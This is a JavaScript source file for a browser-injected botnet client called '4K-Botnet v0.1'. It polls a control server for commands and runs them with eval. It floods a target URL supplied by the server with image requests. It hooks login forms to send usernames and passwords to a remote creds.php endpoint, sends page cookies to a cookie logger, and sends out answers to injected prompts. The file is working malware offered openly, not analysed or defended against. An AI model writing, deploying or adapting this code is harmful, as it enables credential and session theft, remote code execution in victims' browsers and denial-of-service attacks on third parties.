//4K-Botnet v0.1 by Chowix40
//I know it's crap but it works (Kinda)
var SERVER_URL = 'http://example.com/Botnet/'
//console.log('4K-Botnet v0.1 by Chowix40')

//Stage 0 - Shows it's been injected
//console.log('Hijacked - Stage 0');

//Stage 1 - Tells the server "I'm Here!"
//console.log('Connected to server - Stage 1');

//Stage 2 - Get Commands
//console.log('Got Commands - Stage 2')

function getCMD() {
var oReqcmd = new XMLHttpRequest();    
oReqcmd.addEventListener("load", reqListener);
oReqcmd.open("GET", SERVER_URL+"cmds.php");
oReqcmd.send(null);

function reqListener() {
//console.log('Raw Commands: '+ oReqcmd.responseText)
eval(oReqcmd.responseText)
}
}

//Stage 3 - Execute commands
//console.log('Execute commands - Stage 3')
getCMD()

//Functions - 1. DDoS, 2. Get_Creds, 3. Cookie_Grabber 4. userAlert 5. promptUser

//1) DDos
function DDoS() { 
//Gets the URL to DDoS
var oReq = new XMLHttpRequest();    
oReq.addEventListener("load", reqListener);
oReq.open("GET", SERVER_URL+"url.php");
oReq.send(null);
    
function reqListener() {
//console.log('DDoSing ' + oReq.responseText);
setInterval(DDosX, 10);
}
    
//Original DDoS code taken from the Cloudflare blog - https://blog.cloudflare.com/an-introduction-to-javascript-based-ddos/
function DDosX() {  
    
  var TARGET = oReq.responseText
  var URI = '/index.php?page=index.php'
  var pic = new Image()
  var rand = Math.floor(Math.random() * 1000)
  pic.src = 'http://'+TARGET+URI+rand+'=val'
}    
} //Done, Attack Untested, Needs optimization

//2) Get_Creds
function getCreds() {
//Original code taken from Gumshoe but modified by Chowix40 
//console.log('4K-Botnet getCreds')
   var forms = document.getElementsByTagName('form');

    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      var fields = form.getElementsByTagName('input');

      // attempt to locate user/pass elements
      for (var j = 0; j < fields.length; j++) {
          var f = fields[j];

          // recognize user/pass form elements
          if (!form._pass && f.type == 'password')
              form._pass = f;
          else if (!form._user && (f.type == 'text' || f.type == 'email'))
              form._user = f;

          // wait until user/pass are found
          if (!(form._user !== undefined && form._pass !== undefined))
              continue;

          // user/pass elements found
          // add event handler to form
          form.onsubmit = function() {
              if (this._user.value && this._pass.value) {
                  // post credentials to background
                var userName = this._user.value
                var passWord = this._pass.value
                var pic = new Image()
                pic.src = SERVER_URL+'creds.php?user='+userName+'&pass='+passWord
              }
                  }};
              }
        }; //Done

//3) Cookie_Grabber
function getCookies() {
//Code taken from http://hackiteasy.blogspot.com/2011/01/session-hijacking-or-cookie-stealing.html
//console.log('Calling the Cookie Monster...')
var pic = new Image()
pic.src = SERVER_URL+'cookielogger.php?cookie='+document.cookie
} //Done 

//4) Alert_User
function userAlert() {
//console.log('Alerting user: ' + arguments[0]);
alert(arguments[0])
} //Done 

//5) injectHeader
function injectHeader() {
   // console.log('Injecting the header: ' + arguments[0])
    d=document;e=d.createElement("h1");e.innerHTML=arguments[0];d.body.appendChild(e)
} //It works, but Needs work, it inserts header at bottom of page- need to get it on the top, might remove in the future

//6) promptUser
function promptUser() {
    console.log('Prompting the user: '+arguments[0])
    var promptAnswer = prompt(arguments[0]);
    //console.log('Answer is: '+promptAnswer);
    var pic = new Image()
    pic.src = SERVER_URL+'prompt.php?answer='+promptAnswer
} //Done

//7) ???
